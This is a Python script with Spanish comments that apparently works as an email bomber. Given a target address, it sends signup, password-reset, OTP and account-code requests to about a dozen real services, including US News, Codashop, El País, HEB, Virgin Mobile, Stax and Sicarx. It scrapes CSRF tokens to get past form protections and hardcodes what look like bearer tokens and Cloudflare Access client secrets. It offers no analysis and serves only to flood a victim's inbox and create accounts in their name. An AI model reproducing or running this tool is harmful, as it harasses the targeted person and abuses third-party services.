#!/usr/bin/env python3
# pip install requests
import requests, sys
import traceback
import json
import re

# Recibe email como argumento (igual que tu script SMS)
if len(sys.argv) < 2:
    print("❌ Falta el email.")
    exit()

USER = sys.argv[1]

print(f"📧 Enviando requests a {USER}...\n")

# ===============================
# 1. USNEWS REGISTER
# ===============================
URL = "https://cognito-idp.us-east-1.amazonaws.com/"

headers = {
    "accept": "*/*",
    "content-type": "application/x-amz-json-1.1",
    "origin": "https://money.usnews.com",
    "referer": "https://money.usnews.com/",
    "user-agent": "Mozilla/5.0",
    "x-amz-target": "AWSCognitoIdentityProviderService.SignUp",
    "x-amz-user-agent": "aws-amplify/5.0.4 js"
}

data = {
    "ClientId": "2q17ud509vvjvs5svj5ql4tt1q",
    "Username": USER,
    "Password": "Gearsofwar33Q@",
    "UserAttributes": [],
    "ValidationData": None
}

try:
    r = requests.post(URL, headers=headers, json=data, timeout=5)
    print("USNEWS:", r.status_code)
except Exception as e:
    print("USNEWS ERROR:", e)

# ===============================
# 2. CODASHOP REGISTER
# ===============================
URL = "https://cognito-idp.ap-southeast-1.amazonaws.com/"

headers = {
    "accept": "*/*",
    "content-type": "application/x-amz-json-1.1",
    "origin": "https://www.codashop.com",
    "referer": "https://www.codashop.com/",
    "user-agent": "Mozilla/5.0",
    "x-amz-target": "AWSCognitoIdentityProviderService.SignUp",
    "x-amz-user-agent": "aws-amplify/0.1.x js"
}

data = {
    "ClientId": "437f3u0sfh7h0av5rlrrjdtmsb",
    "Username": USER,
    "Password": "gEARSOFWAR3",
    "UserAttributes": [
        {"Name": "email", "Value": USER}
    ],
    "ValidationData": [],
    "ClientMetadata": {"country_code": "mx", "lang_code": "es"}
}

try:
    r = requests.post(URL, headers=headers, json=data, timeout=5)
    print("CODASHOP REGISTER:", r.status_code)
except Exception as e:
    print("USNEWS ERROR:", e)

# ===============================
# 3. CODASHOP FORGOT
# ===============================
headers["x-amz-target"] = "AWSCognitoIdentityProviderService.ResendConfirmationCode"

data = {
    "ClientId": "437f3u0sfh7h0av5rlrrjdtmsb",
    "Username": USER,
    "ClientMetadata": {"country_code": "mx", "lang_code": "es"}
}

try:
    r = requests.post(URL, headers=headers, json=data, timeout=5)
    print("CODASHOP FORGOT:", r.status_code)
except Exception as e:
    print("CODASHOP FORGOT:", r.status_code)


# ===============================
# 6. HOTEL
# ===============================

URL = "https://book.hotel-rez.com/v1/guest/auth/signup?language=es"

headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
    "Pragma": "no-cache",
    "Accept": "*/*",
    "Content-Type": "application/json"
}

data = {
    "firstName": "juan",
    "lastName": "prerez",
    "email": USER,
    "password": "Gearsofwar3@",
    "redirectUrl": "%2F%3Flanguage%3Des%26currency%3DMXN"
}

try:
    r = requests.post(URL, headers=headers, json=data, timeout=5)
    print("USNEWS:", r.status_code)
except Exception as e:
    print("USNEWS ERROR:", e)




URL = "https://book.hotel-rez.com/v1/guest/auth/reset-password?language=es"

headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
    "Pragma": "no-cache",
    "Accept": "*/*",
    "Content-Type": "application/json"
}

data = {
    "email": USER
}

try:
    r = requests.post(URL, headers=headers, json=data, timeout=5)
    print("USNEWS:", r.status_code)
except Exception as e:
    print("USNEWS ERROR:", e)


URL = f"https://api.misaldo.com.mx/api/v3/otp?mail={USER}"

headers = {
    "Host": "api.misaldo.com.mx",
    "Content-Type": "application/json",
    "Accept": "application/json",
    "User-Agent": "Mi_Saldo/1.2 CFNetwork/3860.200.71 Darwin/25.1.0",
    "Accept-Language": "es-MX,es-419;q=0.9,es;q=0.8",
    "Accept-Encoding": "gzip, deflate, br",
    "Connection": "keep-alive"
}

try:
    r = requests.get(URL, headers=headers, timeout=5)
    print(r.status_code)
    print(r.cookies.get_dict())
    print(r.text)
except:
    pass

# ===============================
# CODASHOP REGISTER NUEVO
# ===============================

URL = "https://authentication.codashop.com/realms/Codashop/user/register"

headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
    "Pragma": "no-cache",
    "Accept": "*/*",
    "Content-Type": "application/json",
    "x-client-id": "codashop"
}

data = {
    "email": USER,
    "password": "3.hQ*S?@qRAAcRB",
    "name": "juan perez lopez",
    "countryCode": 484,
    "langCode": "es",
    "subscribeMarketing": True
}

try:
    r = requests.post(URL, headers=headers, json=data, timeout=5)

    print("CODASHOP REGISTER:", r.status_code)
    print(r.text)

except Exception as e:
    print("CODASHOP REGISTER ERROR:", e)


# ===============================
# CODASHOP RESET PASSWORD
# ===============================

URL = "https://authentication.codashop.com/realms/Codashop/user/reset-password/request-otp"

headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
    "Pragma": "no-cache",
    "Accept": "*/*",
    "Content-Type": "application/json",
    "x-client-id": "codashop"
}

data = {
    "email": USER,
    "countryCode": 484,
    "languageCode": "es"
}

try:
    r = requests.post(URL, headers=headers, json=data, timeout=5)

    print("CODASHOP RESET:", r.status_code)
    print(r.text)

except Exception as e:
    print("CODASHOP RESET ERROR:", e)
    
    
# ===============================
# ELPAIS REGISTER
# ===============================

URL = "https://publicapi.elpais.com/identity/public/v1/signup"

headers = {
    "accept-encoding": "gzip, deflate, br",
    "accept-language": "es-ES,es;q=0.9,ru;q=0.8",
    "content-type": "application/json",
    "origin": "https://elpais.com",
    "referer": "https://elpais.com/",
    "sec-ch-ua": '" Not A;Brand";v="99", "Chromium";v="96", "Google Chrome";v="96"',
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": '"Windows"',
    "sec-fetch-dest": "empty",
    "sec-fetch-mode": "cors",
    "sec-fetch-site": "same-site",
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36"
}

data = {
    "identity": {
        "userName": USER,
        "credentials": "GEARSOFWAR3"
    },
    "profile": {
        "addresses": [],
        "attributes": [
            {"name": "pais_value", "value": "ES", "type": "String"},
            {"name": "region_value", "value": "CR", "type": "String"},
            {"name": "factura_completa", "value": "S", "type": "String"},
            {"name": "origen_value", "value": "susdig", "type": "String"},
            {"name": "prod_value", "value": "SUSDIG", "type": "String"},
            {"name": "arcsite_value", "value": "el-pais", "type": "String"},
            {"name": "cct_value", "value": "0", "type": "String"},
            {"name": "profile_cct_value", "value": "0", "type": "String"},
            {"name": "ccm_value", "value": "0", "type": "String"},
            {"name": "profile_ccm_value", "value": "0", "type": "String"},
            {"name": "newsletter_value", "value": "0", "type": "String"},
            {"name": "backURL_value", "value": "https://elpais.com/suscripciones/", "type": "String"}
        ],
        "contacts": [],
        "displayName": USER,
        "email": USER,
        "emailVerified": False,
        "firstName": None,
        "lastName": None,
        "secondLastName": None,
        "birthYear": "1996",
        "birthMonth": "09",
        "birthDay": "16"
    }
}

try:
    r = requests.post(URL, headers=headers, json=data, timeout=5)

    print("ELPAIS REGISTER:", r.status_code)
    print(r.text)

except Exception as e:
    print("ELPAIS REGISTER ERROR:", e)


# ===============================
# ELPAIS RESET PASSWORD
# ===============================

URL = "https://publicapi.elpais.com/identity/public/v1/password/reset"

headers = {
    "content-type": "application/json",
    "origin": "https://elpais.com",
    "referer": "https://elpais.com/",
    "sec-ch-ua": '" Not A;Brand";v="99", "Chromium";v="96", "Google Chrome";v="96"',
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": '"Windows"',
    "sec-fetch-dest": "empty",
    "sec-fetch-mode": "cors",
    "sec-fetch-site": "same-site",
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36"
}

data = {
    "userName": USER
}

try:
    r = requests.post(URL, headers=headers, json=data, timeout=5)

    print("ELPAIS RESET:", r.status_code)
    print(r.text)

except Exception as e:
    print("ELPAIS RESET ERROR:", e)    
    
# ===============================
# TUDEPOSITODENTAL REGISTER
# ===============================

URL = "https://www.tudepositodental.com/index.php?controller=registration"

headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
    "Pragma": "no-cache",
    "Accept": "*/*",
    "Content-Type": "application/x-www-form-urlencoded"
}

data = {
    "id_gender": "1",
    "firstname": "juan",
    "lastname": "perz",
    "email": USER,
    "password": "Gearsofwar3@@",
    "birthday": "2000-11-11",
    "psgdpr": "1",
    "customer_privacy": "1",
    "submitCreate": "1"
}

try:
    r = requests.post(URL, headers=headers, data=data, timeout=5)

    print("TUDEPOSITODENTAL REGISTER:", r.status_code)
    print(r.text)

except Exception as e:
    print("TUDEPOSITODENTAL REGISTER ERROR:", e)


# ===============================
# TUDEPOSITODENTAL RESET PASSWORD
# ===============================

URL = "https://www.tudepositodental.com/ha-olvidado-su-contrasena"

headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
    "Pragma": "no-cache",
    "Accept": "*/*",
    "Content-Type": "application/x-www-form-urlencoded"
}

data = {
    "email": USER,
    "submit": ""
}

try:
    r = requests.post(URL, headers=headers, data=data, timeout=5)

    print("TUDEPOSITODENTAL RESET:", r.status_code)
    print(r.text)

except Exception as e:
    print("TUDEPOSITODENTAL RESET ERROR:", e)    
    
    
# ===============================
# VAMASA REGISTER
# ===============================

URL = "https://vamasa.com.mx/api/auth/callback/credentials"

headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36",
    "Accept": "*/*",
    "Content-Type": "application/x-www-form-urlencoded",
    "Origin": "https://vamasa.com.mx",
    "Referer": "https://vamasa.com.mx/login"
}

# PRIMERO OBTENER EL CSRF TOKEN
try:
    s = requests.Session()

    csrf_url = "https://vamasa.com.mx/api/auth/csrf"

    csrf_response = s.get(csrf_url, headers=headers, timeout=10)

    csrf_json = csrf_response.json()

    csrfToken = csrf_json.get("csrfToken")

    print("CSRF TOKEN:", csrfToken)

except Exception as e:
    print("ERROR OBTENIENDO CSRF:", e)
    csrfToken = None

# REGISTRO
if csrfToken:

    data = {
        "action": "register",
        "redirect": "true",
        "name": "bran",
        "lastName": "aaaa",
        "email": USER,
        "tel": "+522481865169",
        "password": "Gearsofwar3",
        "csrfToken": csrfToken,
        "callbackUrl": "https://vamasa.com.mx/login",
        "json": "true"
    }

    try:
        r = s.post(URL, headers=headers, data=data, timeout=10)

        print("VAMASA REGISTER:", r.status_code)
        print(r.text)

    except Exception as e:
        print("VAMASA REGISTER ERROR:", e)


# ===============================
# VAMASA RESET PASSWORD
# ===============================

URL = "https://us-central1-catalogo-mais-odonto.cloudfunctions.net/recoveryAccount"

headers = {
    "accept": "*/*",
    "accept-language": "es-419,es;q=0.9",
    "authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXAiOiJndWVzdCIsInN1YiI6Imd1ZXN0IiwiaWF0IjoxNzc5Mjk4MzE5LCJleHAiOjE3Nzk5MDMxMTksImF1ZCI6ImZyb250ZW5kLWVjb21tZXJjZSIsImlzcyI6InNvdS1iYWNrZW5kLWZ1bmN0aW9ucyJ9.XM26HJuNYMTw7pb5V9GD_zbeo9PTQelN6FtBO9QEZeA",
    "origin": "https://vamasa.com.mx",
    "priority": "u=1, i",
    "referer": "https://vamasa.com.mx/",
    "sec-ch-ua": '"Chromium";v="148", "Google Chrome";v="148", "Not/A)Brand";v="99"',
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": '"Windows"',
    "sec-fetch-dest": "empty",
    "sec-fetch-mode": "cors",
    "sec-fetch-site": "cross-site",
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36"
}

params = {
    "email": USER,
    "appId": "n36bgGeZl5dmDDqcleCd",
    "nationalities": "mx"
}

try:
    r = requests.get(
        URL,
        headers=headers,
        params=params,
        timeout=10
    )

    print("VAMASA RESET:", r.status_code)
    print(r.text)

except Exception as e:
    print("VAMASA RESET ERROR:", e)




# ===============================
# MIPERFIL REGISTER
# ===============================

URL = "https://miperfil.deia.eus/api/deia/user/create"

headers = {
    "Content-Type": "application/json",
    "Origin": "https://miperfil.deia.eus",
    "Referer": "https://miperfil.deia.eus/deia/auth/registro",
    "sec-ch-ua": '"Google Chrome";v="95", "Chromium";v="95", ";Not A Brand";v="99"',
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": '"Windows"',
    "sec-fetch-dest": "empty",
    "sec-fetch-mode": "cors",
    "sec-fetch-site": "same-origin",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36",
    "x-xsrf-token": "eyJpdiI6InJlbWNNSFFod1g4SE5Jbi9SemJ5U0E9PSIsInZhbHVlIjoiUnpOMFdQTEZkdm12UWFPM1pFcjFWWk8xSkFlZU11TS9VREZDQnNCQ0o3cEM0Z0xKWGdYd21NVi9Td1o3MVphMW9YdW9qR2ZPZ1ZveWtOcXZsVjM4czEyUGpzLzFGV3VUcmExMUNHRXZOeFh6bFlwb3ptbEdQYXhvZ0RlalVVc1oiLCJtYWMiOiI5YjhjMmRkZjFhYWY3Yjg1YTMwYjY4NGUyNTE1NzFmZmI1MzFjYTM4YmRiNjM2YTM1NjlmYzIxYTFiNmZjZmU3IiwidGFnIjoiIn0="
}

data = {
    "email": USER,
    "password": "deja27y_o259d@gexik.com",
    "codigoPostal": "74000",
    "mailPromo": True,
    "acceptPrivacy": True,
    "nombre": "JUAN",
    "apellido1": "PEREZ",
    "apellido2": "LOPEZ",
    "fechaNacimiento": "2000-01-03",
    "sexo": "H"
}

try:
    r = requests.post(
        URL,
        headers=headers,
        json=data,
        timeout=10
    )

    print("MIPERFIL REGISTER:", r.status_code)
    print(r.text)

except Exception as e:
    print("MIPERFIL REGISTER ERROR:", e)


# ===============================
# MIPERFIL RESET PASSWORD
# ===============================

URL = "https://miperfil.deia.eus/api/deia/user/forgot"

headers = {
    "Content-Type": "application/json",
    "Origin": "https://miperfil.deia.eus",
    "Referer": "https://miperfil.deia.eus/deia/auth/registro",
    "sec-ch-ua": '"Google Chrome";v="95", "Chromium";v="95", ";Not A Brand";v="99"',
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": '"Windows"',
    "sec-fetch-dest": "empty",
    "sec-fetch-mode": "cors",
    "sec-fetch-site": "same-origin",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36",
    "x-xsrf-token": "eyJpdiI6InJlbWNNSFFod1g4SE5Jbi9SemJ5U0E9PSIsInZhbHVlIjoiUnpOMFdQTEZkdm12UWFPM1pFcjFWWk8xSkFlZU11TS9VREZDQnNCQ0o3cEM0Z0xKWGdYd21NVi9Td1o3MVphMW9YdW9qR2ZPZ1ZveWtOcXZsVjM4czEyUGpzLzFGV3VUcmExMUNHRXZOeFh6bFlwb3ptbEdQYXhvZ0RlalVVc1oiLCJtYWMiOiI5YjhjMmRkZjFhYWY3Yjg1YTMwYjY4NGUyNTE1NzFmZmI1MzFjYTM4YmRiNjM2YTM1NjlmYzIxYTFiNmZjZmU3IiwidGFnIjoiIn0="
}

data = {
    "email": USER,
    "campoControl": ""
}

try:
    r = requests.post(
        URL,
        headers=headers,
        json=data,
        timeout=10
    )

    print("MIPERFIL RESET:", r.status_code)
    print(r.text)

except Exception as e:
    print("MIPERFIL RESET ERROR:", e)


# ===============================
# HEB REGISTER
# ===============================

URL = "https://heb-cms-prod.eastus.cloudapp.azure.com/auth/signup"

headers = {
    "accept": "application/json, text/plain, */*",
    "accept-encoding": "gzip, deflate, br, zstd",
    "accept-language": "es-419,es;q=0.9",
    "cache-control": "no-cache",
    "content-type": "application/json",
    "origin": "https://micuenta.heb.com.mx",
    "priority": "u=1, i",
    "referer": "https://micuenta.heb.com.mx/",
    "sec-ch-ua": '"Chromium";v="146", "Not-A.Brand";v="24", "Google Chrome";v="146"',
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": '"Windows"',
    "sec-fetch-dest": "empty",
    "sec-fetch-mode": "cors",
    "sec-fetch-site": "cross-site",
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36",
    "workflow-channel": "HEB"
}

data = {
    "first_name": "JUAN",
    "last_name": "PEREZ",
    "username": USER,
    "password": "ey9zJ!5Zh*ZX.4D"
}

try:
    r = requests.post(
        URL,
        headers=headers,
        json=data,
        timeout=10
    )

    print("HEB REGISTER:", r.status_code)
    print(r.text)

except Exception as e:
    print("HEB REGISTER ERROR:", e)


# ===============================
# HEB SEND ACCOUNT CODE
# ===============================

URL = "https://heb-cms-prod.eastus.cloudapp.azure.com/auth/send-new-user-account-code"

headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
    "Pragma": "no-cache",
    "Accept": "*/*",
    "Content-Type": "application/json"
}

data = {
    "email": USER
}

try:
    r = requests.post(
        URL,
        headers=headers,
        json=data,
        timeout=10
    )

    print("HEB SEND CODE:", r.status_code)
    print(r.text)

except Exception as e:
    print("HEB SEND CODE ERROR:", e)




# =====================================
# NANOPAY OTP
# =====================================

nano_url = "https://api.nanopay.mx/ucenter/api/v2/sendH5Otp"

nano_headers = {
    "Host": "api.nanopay.mx",
    "Origin": "https://nanopay.mx",
    "platform": "h5",
    "Referer": "https://nanopay.mx/",
    "sec-ch-ua": '" Not A;Brand";v="99", "Chromium";v="96", "Google Chrome";v="96"',
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": '"Windows"',
    "Sec-Fetch-Dest": "empty",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Site": "same-site",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36",
    "Content-Type": "application/x-www-form-urlencoded"
}

nano_payload = {
    "accessToken": None,
    "feedRecordId": None,
    "appVersionCode": 159,
    "email": USER,
    "smsType": 1,
    "formTips": False,
    "clientType": "marketing"
}

nano_data = {
    "data": json.dumps(nano_payload, separators=(",", ":"))
}

try:

    r = requests.post(
        nano_url,
        headers=nano_headers,
        data=nano_data,
        timeout=10
    )

    print("NANOPAY OTP:", r.status_code)
    print(r.text)

except Exception as e:
    print("NANOPAY ERROR:", e)
    
    
    
# =====================================
# GANDHI START LOGIN
# =====================================

start_url = "https://www.gandhi.com.mx/api/vtexid/pub/authentication/startlogin"

start_headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko",
    "Pragma": "no-cache",
    "Accept": "*/*"
}

start_data = {
    "accountName": "gandhi",
    "scope": "gandhi",
    "returnUrl": "https://www.gandhi.com.mx/checkout/",
    "callbackUrl": "https://www.gandhi.com.mx/api/vtexid/oauth/finish?popup=false",
    "user": USER,
    "fingerprint": ""
}

try:

    r = s.post(
        start_url,
        headers=start_headers,
        files={},
        data=start_data,
        timeout=10
    )

    print("GANDHI START:", r.status_code)
    print(r.text)

except Exception as e:
    print("GANDHI START ERROR:", e)


# =====================================
# GANDHI SEND ACCESS KEY
# =====================================

send_url = "https://www.gandhi.com.mx/api/vtexid/pub/authentication/accesskey/send"

send_headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
    "Pragma": "no-cache",
    "Accept": "*/*"
}

send_data = {
    "email": USER,
    "locale": "es-MX",
    "recaptcha": "",
    "recaptchaToken": ""
}

try:

    r = s.post(
        send_url,
        headers=send_headers,
        files={},
        data=send_data,
        timeout=10
    )

    print("GANDHI SEND:", r.status_code)
    print(r.text)

except Exception as e:
    print("GANDHI SEND ERROR:", e)    
    
    
    
# =====================================
# VIRGIN MOBILE REGISTER
# =====================================

register_url = "https://app.virginmobile.co/api/securityaccess/users/signup"

register_headers = {
    "accept": "application/json",
    "accept-encoding": "gzip, deflate, br",
    "accept-language": "es-ES,es;q=0.9,ru;q=0.8",
    "content-type": "application/json",
    "origin": "https://www.virginmobile.co",
    "referer": "https://www.virginmobile.co/",
    "sec-ch-ua": '" Not A;Brand";v="99", "Chromium";v="96", "Google Chrome";v="96"',
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": '"Windows"',
    "sec-fetch-dest": "empty",
    "sec-fetch-mode": "cors",
    "sec-fetch-site": "same-site",
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"
}

register_data = {
    "nickname": "juan1223",
    "email": USER,
    "password": "Gearsofwar3",
    "terminosCondiciones": True,
    "politicaDatos": True,
    "originRegister": {
        "id": 1,
        "description": None,
        "name": None
    },
    "channelType": "PORTAL",
    "confirmationAccountUrl": "https://www.virginmobile.co/inicio/activacion-cuenta"
}

try:

    r = s.post(
        register_url,
        headers=register_headers,
        json=register_data,
        timeout=10
    )

    print("VIRGIN REGISTER:", r.status_code)
    print(r.text)

except Exception as e:
    print("VIRGIN REGISTER ERROR:", e)


# =====================================
# VIRGIN MOBILE RESET PASSWORD
# =====================================

reset_url = "https://app.virginmobile.co/api/securityaccess/users/forgot-password"

reset_headers = {
    "content-type": "application/json",
    "origin": "https://www.virginmobile.co",
    "referer": "https://www.virginmobile.co/",
    "sec-ch-ua": '" Not A;Brand";v="99", "Chromium";v="96", "Google Chrome";v="96"',
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": '"Windows"',
    "sec-fetch-dest": "empty",
    "sec-fetch-mode": "cors",
    "sec-fetch-site": "same-site",
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"
}

reset_data = {
    "email": USER,
    "confirmationAccountUrl": "https://www.virginmobile.co/inicio/cambiar-contrasena"
}

try:

    r = s.post(
        reset_url,
        headers=reset_headers,
        json=reset_data,
        timeout=10
    )

    print("VIRGIN RESET:", r.status_code)
    print(r.text)

except Exception as e:
    print("VIRGIN RESET ERROR:", e)    
    
    
    
# =====================================
# GET CSRF TOKEN
# =====================================

token_url = "https://www.stax.shop/login"

token_headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
    "Pragma": "no-cache",
    "Accept": "*/*"
}

try:

    r = s.get(
        token_url,
        headers=token_headers,
        timeout=10
    )

    print("TOKEN PAGE:", r.status_code)

    match = re.search(
        r'name="csrf_token"\s+value="([^"]+)"',
        r.text
    )

    if match:
        token_stax = match.group(1)
        print("CSRF TOKEN:", token_stax)
    else:
        print("NO CSRF TOKEN FOUND")
        print(r.text[:3000])
        raise SystemExit

except Exception as e:
    print("TOKEN ERROR:", e)
    raise SystemExit


# =====================================
# STAX REGISTER
# =====================================

register_url = "https://www.stax.shop/on/demandware.store/Sites-StaxMX-Site/es_MX/Account-SubmitRegistration?rurl=1"

register_headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
    "Pragma": "no-cache",
    "Accept": "*/*",
    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"
}

register_data = {
    "dwfrm_profile_customer_firstname": "JUAN",
    "dwfrm_profile_customer_lastname": "PEREZ",
    "dwfrm_profile_customer_phone": "2481709256",
    "dwfrm_profile_customer_gender": "1",
    "dwfrm_profile_customer_birthday": "1999-11-11",
    "dwfrm_profile_customer_email": USER,
    "dwfrm_profile_customer_emailconfirm": USER,
    "dwfrm_profile_login_password": "Gearsofwar3@",
    "dwfrm_profile_login_passwordconfirm": "Gearsofwar3@",
    "dwfrm_profile_customer_addtoemaillist": "true",
    "csrf_token": token_stax
}

try:

    r = s.post(
        register_url,
        headers=register_headers,
        data=register_data,
        timeout=10
    )

    print("STAX REGISTER:", r.status_code)
    print(r.text[:3000])

except Exception as e:
    print("STAX REGISTER ERROR:", e)


# =====================================
# STAX RESET PASSWORD
# =====================================

reset_url = "https://www.stax.shop/on/demandware.store/Sites-StaxMX-Site/es_MX/Account-PasswordResetDialogForm?mobile="

reset_headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
    "Pragma": "no-cache",
    "Accept": "*/*",
    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"
}

reset_data = {
    "loginEmail": USER
}

try:

    r = s.post(
        reset_url,
        headers=reset_headers,
        data=reset_data,
        timeout=10
    )

    print("STAX RESET:", r.status_code)
    print(r.text)

except Exception as e:
    print("STAX RESET ERROR:", e)    
    
    
# =====================================
# SICARX REGISTER
# =====================================

register_url = "https://ea.sicarx.com/v1/registry/complete"

register_headers = {
    "accept": "application/json, text/plain, */*",
    "accept-encoding": "gzip, deflate, br, zstd",
    "accept-language": "es-419,es;q=0.9",
    "cf-access-client-id": "8fc5b7d7a5bc803480d13d418b3bff37.access",
    "cf-access-client-secret": "5a6ada4d843e323c6f0a953c82cc593d3833750b247a662c25c04de0b1589d0f",
    "content-type": "application/json",
    "origin": "https://app.sicarx.com",
    "priority": "u=1, i",
    "referer": "https://app.sicarx.com/",
    "sec-ch-ua": '"Chromium";v="148", "Google Chrome";v="148", "Not/A)Brand";v="99"',
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": '"Windows"',
    "sec-fetch-dest": "empty",
    "sec-fetch-mode": "cors",
    "sec-fetch-site": "same-site",
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36"
}

register_data = {
    "name": "juan perez lopez",
    "email": USER,
    "password": "9539ee10b99aebd87b1b7e0156ba0983cc12a3f7e4ab2d33347430e9315ed12688ebb96c795f4200148f1df6a3ef93e38db49f539d893d7399286d304c7ef32a",
    "phoneCode": "52",
    "phoneNumber": "2481709250",
    "businessType": "Abarrotes / Miscelanea",
    "businessTypeId": "1",
    "country": "México",
    "countryCode": "52",
    "isoCurrency": "MXN",
    "deviceType": "Web",
    "confirmPassword": "$SRf76qAL$nz4di"
}

try:

    r = s.post(
        register_url,
        headers=register_headers,
        json=register_data,
        timeout=10
    )

    print("SICARX REGISTER:", r.status_code)
    print(r.text)

except Exception as e:
    print("SICARX REGISTER ERROR:", e)


# =====================================
# SICARX RECOVERY
# =====================================

recovery_url = f"https://api.sicarx.com/account/v1/account/recovery?email={USER}"

recovery_headers = {
    "accept": "application/json, text/plain, */*",
    "accept-encoding": "gzip, deflate, br, zstd",
    "accept-language": "es-419,es;q=0.9",
    "cf-access-client-id": "8fc5b7d7a5bc803480d13d418b3bff37.access",
    "cf-access-client-secret": "5a6ada4d843e323c6f0a953c82cc593d3833750b247a662c25c04de0b1589d0f",
    "content-type": "application/json;charset=UTF-8",
    "origin": "https://app.sicarx.com",
    "priority": "u=1, i",
    "referer": "https://app.sicarx.com/",
    "sec-ch-ua": '"Chromium";v="148", "Google Chrome";v="148", "Not/A)Brand";v="99"',
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": '"Windows"',
    "sec-fetch-dest": "empty",
    "sec-fetch-mode": "cors",
    "sec-fetch-site": "same-site",
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36"
}

recovery_data = {
    "email": USER
}

try:

    r = s.post(
        recovery_url,
        headers=recovery_headers,
        json=recovery_data,
        timeout=10
    )

    print("SICARX RECOVERY:", r.status_code)
    print(r.text)

except Exception as e:
    print("SICARX RECOVERY ERROR:", e)    
    
    
    
    
    
    